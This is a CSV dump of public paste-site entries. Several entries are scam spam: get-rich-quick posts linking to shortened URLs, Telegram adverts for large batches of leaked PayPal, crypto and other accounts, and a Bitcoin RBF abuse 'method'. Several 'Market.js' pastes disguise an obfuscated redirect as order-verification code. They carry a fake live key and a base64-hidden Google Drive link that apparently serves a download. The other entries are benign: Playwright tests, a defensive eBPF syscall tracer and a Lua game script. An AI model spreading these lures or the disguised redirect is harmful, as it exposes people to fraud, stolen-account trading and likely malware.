id,title,username,language,date,content
cCzmuVJk,Make $1000 15-MINUTES (BEGINNER) L4,EpikGod,JavaScript,Friday 2nd of May 2025 07:07:05 AM CDT," 
Pdf https://tinyurl.com/freshleaks

RA2nLrA7fp
"
U3e3Cvib,Market.js,SpawnKz,JavaScript,Friday 2nd of May 2025 06:59:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37805/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0YtQNH7E,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:59:01 AM CDT,59801 Accounts Posted On https://t.me/leakzbyeminem
URXGeWhG,EARN $900 INSTANTLY 2025⭐ GV,EpikGod,JavaScript,Friday 2nd of May 2025 06:57:50 AM CDT," 
Pdf https://tinyurl.com/freshleaks

FSAvBPMrae
"
ExZCkVMA,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Friday 2nd of May 2025 06:55:53 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 48112
t4GuJGBw,Untitled,djbob2000,TypeScript,Friday 2nd of May 2025 06:55:18 AM CDT,"import { UiTester } from ""@fernir2/saas-kit/test/fd-test-ui-tester"";
import { LoginPo } from ""./page-objects/staging-login-po"";
import { ListPo, TablePo, EditPo } from ""@fernir2/saas-kit/fd-meta-tester-ui/page-objects"";
import { resourceNames } from ""@fernir2/saas-kit/fd-toolbox/resources"";
import { MaterialUiTester } from ""@fernir2/saas-kit/fd-meta-tester-ui/materials"";
import test, { Page } from ""@playwright/test"";
import { personProps } from ""@fernir2/saas-kit/dev/props"";
import { elementSuffixes } from ""@fernir2/saas-kit/meta/constants"";
import { expect } from ""@playwright/test"";

const baseUrl = process.env[""BASE_URL""] ?? ""https://saas-kit-staging.fernir.biz"";

const person = {
    id: ""2e300f29-11c8-4429-8f63-63b5d53348e4"",
    name: ""EricTest"",
    age: 69,
    imageUrl: """",
    description: ""This is a test description"",
    isMarried: false,
    maritalStatus: 0,
    workspaceId: """",
    createdDate: new Date(),
    favoriteNumber: 0,
    hasKids: false,
    areKidsVaccinated: false,
    firstbornName: """",
    education: """",
    bio: """",
    createdByUserId: """",
    modifiedDate: new Date(),
    modifiedByUserId: """",
};

const personsTable = ""#ResourceListPersonTable"";

export async function assertInputValue(page: Page, propertyName: string, expectedValue: string) {
    const elementId = propertyName + elementSuffixes.edit;
    await expect(page.locator(`#${elementId}`)).toHaveValue(expectedValue);
}

test(""Edit person test"", async ({ page }) => {
    //Arrange
    const uiTester = new UiTester(page);
    const loginPo = new LoginPo(page);
    const listPo = new ListPo(uiTester);
    const tablePo = new TablePo(uiTester);
    const materialUiTester = new MaterialUiTester(uiTester);
    const editPo = new EditPo(uiTester, materialUiTester);
    await loginPo.login();

    //Act

    await page.goto(`${baseUrl}/view?resource=Person`);
    await page.waitForURL(""**/view?resource=Person"");

    await tablePo.clickEditButton(person.id);
    await editPo.setInputValue(personProps.name, person.name);
    await editPo.setInputValue(personProps.age, person.age.toString());
    await editPo.clickBackButton(resourceNames.person);
    await page.waitForURL(""**/view?resource=Person"");

    // const rowIndex = await tablePo.getResourceIndexByResourceId(person.id);
    const row = page.locator(`${personsTable} [id^=\""ResourceListPersonTableRow\""]`, {
        hasText: person.name,
    });
    await expect(row).toBeVisible();
    await expect(row.locator(""p"", { hasText: `${person.name} Malone` })).toBeVisible();
});
"
9AhwBJQs,eBPF-Syscall-Tracer.sh,xe1phix,Bash,Friday 2nd of May 2025 06:55:15 AM CDT,"#!/bin/bash
# eBPF Syscall Tracer
# 
# This script uses eBPF to trace and analyze system calls made by suspicious processes.
# It helps identify potential malware behavior patterns by monitoring syscall frequency,
# arguments, and return values.
#
# Options:
# 1. Trace all syscalls for a specific PID
# 2. Monitor syscalls related to file operations
# 3. Monitor syscalls related to network operations
# 4. Monitor syscalls related to process creation
# 5. Monitor syscalls related to memory operations
# 6. Monitor syscalls related to permission changes
# 7. Monitor specific syscall by name
# 8. Monitor syscalls for newly created processes
# 9. Generate frequency report of syscalls
# 10. Filter syscalls by return value (errors)
# 11. Trace syscalls with arguments
# 12. Export traced syscalls to JSON format
# 13. Compare syscall patterns with known malware profiles
# 14. Detect anomalous syscall patterns
# 15. Generate visualization of syscall relationships
# 16. Exit

# Check for required tools
command -v bpftrace >/dev/null 2>&1 || { echo ""Error: bpftrace is required but not installed. Install with: apt-get install bpftrace""; exit 1; }

# Function to display menu
show_menu() {
    clear
    echo ""===== eBPF Syscall Tracer =====""
    echo ""1. Trace all syscalls for a specific PID""
    echo ""2. Monitor syscalls related to file operations""
    echo ""3. Monitor syscalls related to network operations""
    echo ""4. Monitor syscalls related to process creation""
    echo ""5. Monitor syscalls related to memory operations""
    echo ""6. Monitor syscalls related to permission changes""
    echo ""7. Monitor specific syscall by name""
    echo ""8. Monitor syscalls for newly created processes""
    echo ""9. Generate frequency report of syscalls""
    echo ""10. Filter syscalls by return value (errors)""
    echo ""11. Trace syscalls with arguments""
    echo ""12. Export traced syscalls to JSON format""
    echo ""13. Compare syscall patterns with known malware profiles""
    echo ""14. Detect anomalous syscall patterns""
    echo ""15. Generate visualization of syscall relationships""
    echo ""16. Exit""
    echo ""================================""
    echo ""Enter your choice [1-16]: ""
}

# Function to trace all syscalls for a specific PID
trace_pid_syscalls() {
    read -p ""Enter PID to trace: "" pid
    echo ""Tracing all syscalls for PID $pid. Press Ctrl+C to stop.""
    sudo bpftrace -e ""tracepoint:syscalls:sys_enter_* /pid == $pid/ { @[probe] = count(); }""
}

# Function to monitor file operation syscalls
monitor_file_syscalls() {
    echo ""Monitoring file operation syscalls. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_enter_open,
    tracepoint:syscalls:sys_enter_openat,
    tracepoint:syscalls:sys_enter_read,
    tracepoint:syscalls:sys_enter_write,
    tracepoint:syscalls:sys_enter_close,
    tracepoint:syscalls:sys_enter_unlink,
    tracepoint:syscalls:sys_enter_rename,
    tracepoint:syscalls:sys_enter_mkdir,
    tracepoint:syscalls:sys_enter_rmdir
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to monitor network operation syscalls
monitor_network_syscalls() {
    echo ""Monitoring network operation syscalls. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_enter_socket,
    tracepoint:syscalls:sys_enter_connect,
    tracepoint:syscalls:sys_enter_accept,
    tracepoint:syscalls:sys_enter_bind,
    tracepoint:syscalls:sys_enter_listen,
    tracepoint:syscalls:sys_enter_sendto,
    tracepoint:syscalls:sys_enter_recvfrom,
    tracepoint:syscalls:sys_enter_sendmsg,
    tracepoint:syscalls:sys_enter_recvmsg
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to monitor process creation syscalls
monitor_process_syscalls() {
    echo ""Monitoring process creation syscalls. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_enter_fork,
    tracepoint:syscalls:sys_enter_vfork,
    tracepoint:syscalls:sys_enter_clone,
    tracepoint:syscalls:sys_enter_execve,
    tracepoint:syscalls:sys_enter_execveat,
    tracepoint:syscalls:sys_exit_execve,
    tracepoint:syscalls:sys_exit_execveat
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to monitor memory operation syscalls
monitor_memory_syscalls() {
    echo ""Monitoring memory operation syscalls. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_enter_mmap,
    tracepoint:syscalls:sys_enter_mprotect,
    tracepoint:syscalls:sys_enter_munmap,
    tracepoint:syscalls:sys_enter_brk,
    tracepoint:syscalls:sys_enter_mremap,
    tracepoint:syscalls:sys_enter_remap_file_pages,
    tracepoint:syscalls:sys_enter_madvise
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to monitor permission change syscalls
monitor_permission_syscalls() {
    echo ""Monitoring permission change syscalls. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_enter_chmod,
    tracepoint:syscalls:sys_enter_fchmod,
    tracepoint:syscalls:sys_enter_fchmodat,
    tracepoint:syscalls:sys_enter_chown,
    tracepoint:syscalls:sys_enter_fchown,
    tracepoint:syscalls:sys_enter_fchownat,
    tracepoint:syscalls:sys_enter_setuid,
    tracepoint:syscalls:sys_enter_setgid,
    tracepoint:syscalls:sys_enter_setreuid,
    tracepoint:syscalls:sys_enter_setregid,
    tracepoint:syscalls:sys_enter_setresuid,
    tracepoint:syscalls:sys_enter_setresgid,
    tracepoint:syscalls:sys_enter_setfsuid,
    tracepoint:syscalls:sys_enter_setfsgid,
    tracepoint:syscalls:sys_enter_capset
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to monitor a specific syscall by name
monitor_specific_syscall() {
    read -p ""Enter syscall name (without 'sys_' prefix): "" syscall_name
    echo ""Monitoring $syscall_name syscall. Press Ctrl+C to stop.""
    sudo bpftrace -e ""
    tracepoint:syscalls:sys_enter_$syscall_name
    {
        time(\""%H:%M:%S \"");
        printf(\""PID: %-6d COMM: %-16s SYSCALL: %s\\n\"", pid, comm, probe);
    }""
}

# Function to monitor syscalls for newly created processes
monitor_new_processes() {
    echo ""Monitoring syscalls for newly created processes. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_exit_fork,
    tracepoint:syscalls:sys_exit_vfork,
    tracepoint:syscalls:sys_exit_clone
    /args->ret > 0/
    {
        printf(""New process created: PID %d (parent: %d, command: %s)\n"", args->ret, pid, comm);
        @new_pids[args->ret] = 1;
    }

    tracepoint:syscalls:sys_enter_*
    /@new_pids[pid]/
    {
        time(""%H:%M:%S "");
        printf(""New PID: %-6d COMM: %-16s SYSCALL: %s\n"", pid, comm, probe);
    }'
}

# Function to generate frequency report of syscalls
generate_frequency_report() {
    read -p ""Enter PID to analyze (0 for all processes): "" pid
    read -p ""Enter duration in seconds: "" duration
    if [ ""$pid"" -eq 0 ]; then
        echo ""Generating syscall frequency report for all processes for $duration seconds...""
        sudo timeout $duration bpftrace -e 'tracepoint:syscalls:sys_enter_* { @[probe] = count(); }' > syscall_frequency_report.txt
    else
        echo ""Generating syscall frequency report for PID $pid for $duration seconds...""
        sudo timeout $duration bpftrace -e ""tracepoint:syscalls:sys_enter_* /pid == $pid/ { @[probe] = count(); }"" > syscall_frequency_report.txt
    fi
    echo ""Report saved to syscall_frequency_report.txt""
    echo ""Top 10 most frequent syscalls:""
    sort -nr -k2 syscall_frequency_report.txt | head -10
}

# Function to filter syscalls by return value (errors)
filter_by_return_value() {
    echo ""Monitoring syscalls that return errors. Press Ctrl+C to stop.""
    sudo bpftrace -e '
    tracepoint:syscalls:sys_exit_*
    /args->ret < 0/
    {
        time(""%H:%M:%S "");
        printf(""PID: %-6d COMM: %-16s SYSCALL: %-30s RET: %d\n"", pid, comm, probe, args->ret);
    }'
}

# Function to trace syscalls with arguments
trace_syscalls_with_args() {
    read -p ""Enter PID to trace (0 for all processes): "" pid
    if [ ""$pid"" -eq 0 ]; then
        echo ""Tracing open syscalls with arguments for all processes. Press Ctrl+C to stop.""
        sudo bpftrace -e '
        tracepoint:syscalls:sys_enter_open,
        tracepoint:syscalls:sys_enter_openat
        {
            time(""%H:%M:%S "");
            printf(""PID: %-6d COMM: %-16s SYSCALL: %s "", pid, comm, probe);
            
            if (probe == ""tracepoint:syscalls:sys_enter_open"") {
                printf(""PATH: %s FLAGS: %d MODE: %d\n"", 
                    str(args->filename), args->flags, args->mode);
            } else {
                printf(""FD: %d PATH: %s FLAGS: %d MODE: %d\n"", 
                    args->dfd, str(args->filename), args->flags, args->mode);
            }
        }'
    else
        echo ""Tracing open syscalls with arguments for PID $pid. Press Ctrl+C to stop.""
        sudo bpftrace -e ""
        tracepoint:syscalls:sys_enter_open,
        tracepoint:syscalls:sys_enter_openat
        /pid == $pid/
        {
            time(\""%H:%M:%S \"");
            printf(\""PID: %-6d COMM: %-16s SYSCALL: %s \"", pid, comm, probe);
            
            if (probe == \""tracepoint:syscalls:sys_enter_open\"") {
                printf(\""PATH: %s FLAGS: %d MODE: %d\\n\"", 
                    str(args->filename), args->flags, args->mode);
            } else {
                printf(\""FD: %d PATH: %s FLAGS: %d MODE: %d\\n\"", 
                    args->dfd, str(args->filename), args->flags, args->mode);
            }
        }""
    fi
}

# Function to export traced syscalls to JSON format
export_to_json() {
    read -p ""Enter PID to trace (0 for all processes): "" pid
    read -p ""Enter duration in seconds: "" duration
    output_file=""syscall_trace_$(date +%Y%m%d_%H%M%S).json""
    
    echo ""Tracing syscalls for $duration seconds and exporting to $output_file...""
    echo ""{\""syscalls\"": ["" > $output_file
    
    if [ ""$pid"" -eq 0 ]; then
        sudo timeout $duration bpftrace -e '
        tracepoint:syscalls:sys_enter_*
        {
            printf(""{\""timestamp\"":\""%s\"",\""pid\"":%d,\""comm\"":\""%s\"",\""syscall\"":\""%s\""},\n"", 
                strftime(""%Y-%m-%d %H:%M:%S"", nsecs), pid, comm, probe);
        }' >> $output_file
    else
        sudo timeout $duration bpftrace -e ""
        tracepoint:syscalls:sys_enter_*
        /pid == $pid/
        {
            printf(\""{\\\""timestamp\\\"":\\\""%s\\\"",\\\""pid\\\"":%d,\\\""comm\\\"":\\\""%s\\\"",\\\""syscall\\\"":\\\""%s\\\""},\\n\"", 
                strftime(\""%Y-%m-%d %H:%M:%S\"", nsecs), pid, comm, probe);
        }"" >> $output_file
    fi
    
    # Fix JSON format (remove trailing comma and close array)
    sed -i '$ s/,$//' $output_file
    echo ""]}"" >> $output_file
    
    echo ""JSON export completed. Saved to $output_file""
}

# Function to compare syscall patterns with known malware profiles
compare_with_known_profiles() {
    read -p ""Enter PID to analyze: "" pid
    echo ""Analyzing syscall patterns for PID $pid and comparing with known malware profiles...""
    
    # Create temporary files
    temp_file=$(mktemp)
    
    # Collect syscall pattern for 10 seconds
    echo ""Collecting syscall pattern for 10 seconds...""
    sudo timeout 10 bpftrace -e ""
    tracepoint:syscalls:sys_enter_*
    /pid == $pid/
    {
        @[probe] = count();
    }"" > $temp_file
    
    # Define known malware patterns (simplified for demonstration)
    echo ""Comparing with known malware patterns...""
    echo ""
    Cryptominer pattern: High frequency of CPU-intensive syscalls (nanosleep, clock_gettime)
    Rootkit pattern: Unusual combinations of module-related syscalls, hidden processes
    Backdoor pattern: Persistent network connections, unusual file access patterns
    Data exfiltration: High frequency of read/write operations followed by network activity
    ""
    
    # Check for cryptominer pattern
    if grep -q ""nanosleep\|clock_gettime"" $temp_file && grep -q ""count: [0-9]\{3,\}"" $temp_file; then
        echo ""WARNING: Process shows patterns consistent with cryptomining malware!""
    fi
    
    # Check for rootkit pattern
    if grep -q ""init_module\|finit_module\|delete_module"" $temp_file; then
        echo ""WARNING: Process shows patterns consistent with rootkit activity!""
    fi
    
    # Check for backdoor pattern
    network_count=$(grep -c ""connect\|sendto\|recvfrom"" $temp_file)
    if [ ""$network_count"" -gt 10 ]; then
        echo ""WARNING: Process shows patterns consistent with backdoor activity!""
    fi
    
    # Clean up
    rm $temp_file
    echo ""Analysis complete.""
}

# Function to detect anomalous syscall patterns
detect_anomalous_patterns() {
    read -p ""Enter monitoring duration in seconds: "" duration
    echo ""Monitoring system for anomalous syscall patterns for $duration seconds...""
    
    # Create temporary files
    baseline_file=$(mktemp)
    
    echo ""Establishing baseline syscall frequency...""
    sudo timeout 5 bpftrace -e '
    tracepoint:syscalls:sys_enter_*
    {
        @[comm, probe] = count();
    }' > $baseline_file
    
    echo ""Monitoring for anomalies...""
    sudo timeout $duration bpftrace -e '
    tracepoint:syscalls:sys_enter_*
    {
        @syscalls[comm, probe] = count();
    }

    interval:s:1
    {
        print(@syscalls);
        print(""Analyzing for anomalous patterns..."");
        clear(@syscalls);
    }'
    
    # Clean up
    rm $baseline_file
    echo ""Anomaly detection complete.""
}

# Function to generate visualization of syscall relationships
generate_visualization() {
    read -p ""Enter PID to visualize: "" pid
    read -p ""Enter duration in seconds: "" duration
    output_file=""syscall_graph_$(date +%Y%m%d_%H%M%S).dot""
    
    echo ""Generating syscall relationship graph for PID $pid for $duration seconds...""
    
    # Create DOT file header
    echo ""digraph syscall_graph {"" > $output_file
    echo ""  node [shape=box];"" >> $output_file
    
    # Collect syscall sequence
    echo ""Collecting syscall sequence...""
    sudo timeout $duration bpftrace -e ""
    tracepoint:syscalls:sys_enter_*
    /pid == $pid/
    {
        printf(\""%s -> \"", probe);
    }"" | sed 's/tracepoint:syscalls:sys_enter_//g' | tr -d '\n' > syscall_sequence.txt
    
    # Process sequence to create graph edges
    echo ""Processing syscall sequence to create graph...""
    prev_syscall=""""
    for syscall in $(cat syscall_sequence.txt | tr ' -> ' '\n' | grep -v ""^$""); do
        if [ ! -z ""$prev_syscall"" ]; then
            echo ""  \""$prev_syscall\"" -> \""$syscall\"";"" >> $output_file
        fi
        prev_syscall=$syscall
    done
    
    # Close DOT file
    echo ""}"" >> $output_file
    
    echo ""Visualization data saved to $output_file""
    echo ""To create a graph image, install graphviz and run: dot -Tpng $output_file -o syscall_graph.png""
    
    # Clean up
    rm syscall_sequence.txt
}

# Main function
main() {
    while true; do
        show_menu
        read choice
        
        case $choice in
            1) trace_pid_syscalls ;;
            2) monitor_file_syscalls ;;
            3) monitor_network_syscalls ;;
            4) monitor_process_syscalls ;;
            5) monitor_memory_syscalls ;;
            6) monitor_permission_syscalls ;;
            7) monitor_specific_syscall ;;
            8) monitor_new_processes ;;
            9) generate_frequency_report ;;
            10) filter_by_return_value ;;
            11) trace_syscalls_with_args ;;
            12) export_to_json ;;
            13) compare_with_known_profiles ;;
            14) detect_anomalous_patterns ;;
            15) generate_visualization ;;
            16) echo ""Exiting...""; exit 0 ;;
            *) echo ""Invalid option. Press Enter to continue...""; read ;;
        esac
        
        echo
        echo ""Operation completed. Press Enter to continue...""
        read
    done
}

# Start the script
main
"
hr04NgcB,Untitled,djbob2000,TypeScript,Friday 2nd of May 2025 06:52:28 AM CDT,"import { type Page } from ""@playwright/test"";
import { UiTester } from ""@fernir2/saas-kit/test/fd-test-ui-tester"";
import ""dotenv/config"";

const baseUrl = process.env[""BASE_URL""] ?? ""https://saas-kit-staging.fernir.biz"";
const cfToken = process.env[""CF_TOKEN""] ?? """";

interface IUiTester {
    page: Page;
}

export class LoginPo {
    readonly #page: Page;

    constructor(pageOrTester: Page | (UiTester & IUiTester)) {
        this.#page = pageOrTester instanceof UiTester ? pageOrTester.page : pageOrTester;
    }

    get page(): Page {
        return this.#page;
    }

    async login() {
        if (!cfToken) {
            throw new Error(""CF_TOKEN is not set! Please check your .env file and how you run the test"");
        }

        await this.page.context().addCookies([
            {
                name: ""CF_Authorization"",
                value: cfToken,
                domain: ""saas-kit-staging.fernir.biz"",
                path: ""/"",
                httpOnly: true,
                secure: true,
                sameSite: ""Lax"",
            },
        ]);

        await this.page.goto(baseUrl);
        await this.page.waitForURL((url) => url.pathname.includes(""sign-in""));
        await this.page.click(""#loginButton"");
        await this.page.waitForURL(""**/view?resource=Contact"");
    }

    async logout() {
        await this.page.click(""#userDropdownMenu"");
        await this.page.click(""#signOutButton"");
        await this.page.waitForURL(`${baseUrl}/sign-in`);
    }
}
"
G0V3MRZJ,"How I Made $6,000 in Just 4 Days – No Skills Needed",Dominik013,JavaScript,Friday 2nd of May 2025 06:49:35 AM CDT,"https://tinyurl.com/nulledleak

#Windows command prompt command"
TYtuKSA7,EARN $900 INSTANTLY 2025⭐ GV,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:48:27 AM CDT," 
Pdf https://tinyurl.com/freshleaks

eot5c7ExcV
"
PqcKw2ts,Untitled,SpawnKz,JavaScript,Friday 2nd of May 2025 06:43:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42695/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ryAiCz6z,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:43:40 AM CDT,72211 Accounts Posted On https://t.me/leakzbyeminem
vSqRknrP,Stake Free Balance Method,WantingTrae,JavaScript,Friday 2nd of May 2025 06:40:31 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 64447
1G09RNik,Make $1000 15-MINUTES  (BEGINNER) YR,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:39:14 AM CDT," 
Pdf https://tinyurl.com/freshleaks

gdJtCCse8T
"
5EdRNnKb,EARN $900 INSTANTLY 2025 95,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:30:00 AM CDT," 
Pdf https://tinyurl.com/freshleaks

6cTMkdbZ3x
"
8bqi3Mkp,Market.js,WantingTrae,JavaScript,Friday 2nd of May 2025 06:28:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55932/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jUeJCzKy,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:28:17 AM CDT,43026 Accounts Posted On https://t.me/leakzbyeminem
b6TJ2EHz,Make $1000 15-MINUTES (BEGINNER) L4,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:20:45 AM CDT," 
Pdf https://tinyurl.com/freshleaks

0UG5aRMv6X
"
rncwTbUx,Settings Manager,Blackhome,Lua,Friday 2nd of May 2025 06:13:07 AM CDT,"-- Settings Writer for Storage System
-- Platziert über dem Disk Drive mit der ""Settings""-Disk

local SETTINGS_LABEL = ""Settings""
local COORD_FILE = ""initial_coords.txt""
local TASK_FILE = ""task.txt""

-- Funktion: Hole Disk-Laufwerk mit Label ""Settings""
function getSettingsDisk()
    for _, side in ipairs(peripheral.getNames()) do
        if peripheral.getType(side) == ""drive"" then
            local disk = peripheral.wrap(side)
            if disk.getDiskLabel() == SETTINGS_LABEL then
                return disk, disk.getMountPath()
            end
        end
    end
    return nil, nil
end

-- Funktion: Überprüft, ob initial_coords.txt bereits existiert
function coordsFileExists()
    local _, path = getSettingsDisk()
    if not path then return false end
    return fs.exists(fs.combine(path, COORD_FILE))
end

-- Funktion: Fragt den Nutzer nach einer Koordinate (in Form ""x y z"")
function askForCoords(promptText)
    while true do
        print(promptText)
        local input = read()
        local x, y, z = input:match(""(-?%d+)%s+(-?%d+)%s+(-?%d+)"")
        if x and y and z then
            return tonumber(x), tonumber(y), tonumber(z)
        else
            print(""Ungültiges Format. Bitte erneut eingeben als: x y z"")
        end
    end
end

-- Funktion: Speichert die beiden Koordinaten in initial_coords.txt
function saveInitialCoords(x1, y1, z1, x2, y2, z2)
    local _, path = getSettingsDisk()
    if not path then error(""Settings-Disk nicht gefunden!"") end

    local fullPath = fs.combine(path, COORD_FILE)
    local file = fs.open(fullPath, ""w"")
    file.writeLine(string.format(""%d,%d,%d"", x1, y1, z1))
    file.writeLine(string.format(""%d,%d,%d"", x2, y2, z2))
    file.close()
    print(""Koordinaten erfolgreich gespeichert."")
end

-- Funktion: Erstellt task.txt auf Settings-Disk
function createTaskFile()
    local _, path = getSettingsDisk()
    if not path then error(""Settings-Disk nicht gefunden!"") end

    local taskPath = fs.combine(path, TASK_FILE)
    local file = fs.open(taskPath, ""w"")
    file.writeLine(""task=create_chests"")
    file.close()
    print(""task.txt erfolgreich erstellt (create_chests)."")
end

-- === Hauptprogramm ===
print(""Starte Settings-Setup..."")

local _, path = getSettingsDisk()
while not path do
    print(""Warte auf eingelegte Settings-Disk..."")
    sleep(1)
    _, path = getSettingsDisk()
end

if coordsFileExists() then
    print(""initial_coords.txt existiert bereits. Keine Aktion erforderlich."")
else
    print(""Keine initial_coords.txt gefunden. Bitte Koordinaten eingeben."")
    local x1, y1, z1 = askForCoords(""Start-Koordinate eingeben (x y z):"")
    local x2, y2, z2 = askForCoords(""End-Koordinate eingeben (x y z):"")
        -- === Nutzerabfrage zur Kistenerstellung ===
        print()
        print(""Sollen die Kisten jetzt manuell erstellt werden oder per Task?"")
        print(""[1] Kisten existieren bereits"")
        print(""[2] Kisten sollen per Task erstellt werden"")
        write(""Auswahl (1 oder 2): "")
        local choice = read()
    
        if choice == ""2"" then
            createTaskFile()
        else
            print(""Kein Task erstellt. Es wird davon ausgegangen, dass die Kisten vorhanden sind."")
        end
    saveInitialCoords(x1, y1, z1, x2, y2, z2)
end
"
kd7ngRCH,Untitled,WantingTrae,JavaScript,Friday 2nd of May 2025 06:13:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ng8HPdRi,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 06:12:54 AM CDT,77169 Accounts Posted On https://t.me/leakzbyeminem
JxLp3WAi,EARN $900 INSTANTLY 2025⭐ GV,SirPleasecalmdown,JavaScript,Friday 2nd of May 2025 06:11:32 AM CDT," 
Pdf https://tinyurl.com/freshleaks

veHCmdtjik
"
wzkhqCJx,dataNone,TestGuy1,JSON,Friday 2nd of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9b7bca3043b47d3c6476c0b88c06b771b10dde59b89b8cba04e4e875107afeb1d5dcb4b33e7b49d3e5001c62e9be455a3a65f38c2273e5e4f4857738af84ce22e0ccbfafdffb86eb8cd1d924c45c975ead17054e15eddfc0196cc4743c177fb5987ee796d0b8222eec55598eac86cbafb8feb8c685947ae3e1d9b6843482d226',
  otherdata: [
    '8aa3308a2f032fee732e1beeabddfd15',
    'de4a852f3442f5388a5a3593dd39388a',
